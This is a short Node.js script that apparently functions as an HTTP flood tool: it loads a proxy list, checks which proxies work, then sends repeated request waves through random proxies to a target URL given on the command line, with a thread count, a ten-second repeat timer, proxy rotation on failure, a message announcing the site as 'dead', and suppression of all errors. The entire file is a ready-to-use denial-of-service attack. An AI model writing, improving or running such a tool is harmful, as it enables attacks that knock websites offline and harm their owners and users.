(async()=>{
    "use strict";

    // Dependencies
    const { runJobs } = require("parallel-park")
    const request = require("request-async")
    const _ = require("lodash")
    const fs = require("fs")
    
    // Variables
    const args = process.argv.slice(2)
    const wP = []
    var pX;

    // Functions
    async function check(){
        const p = wP[Math.floor(Math.random() * wP.length)]

        if(!p) return setTimeout(()=>{check()}, 2000)

        try{
            const r = await request(args[0], {
                proxy: `http://${p}`
            })

            r.statusCode === 200 ? console.log("Request sent.") : console.log("I think website is dead.")
        }catch(err){
            console.log("So annoying! Shifting proxy.")
            _.pull(wP, p)
            check()
        }
    }
    
    // Main
    if(!args.length) return console.log("usage: node index.js <link> <proxies> <threads>")
    
    pX = fs.readFileSync(args[1], "utf8")
    pX = pX.replace(/\r/g, "").split("\n")

    for( let i = 0; i <= args[2]; i++ ) check()
    setInterval(()=>{for( let i = 0; i <= args[2]; i++ ) check()}, 10 * 1000)

    await runJobs(
        pX,
        async(p)=>{
            try{
                await request("https://api.ipify.org/", {
                    timeout: 5000,
                    proxy: `http://${p}`
                })
    
                wP.push(p)
            }catch{}
        },
        {
            concurrency: 100
        }
    )
})()

process.on("uncaughtException", ()=>{return})
process.on("unhandledRejection", ()=>{return})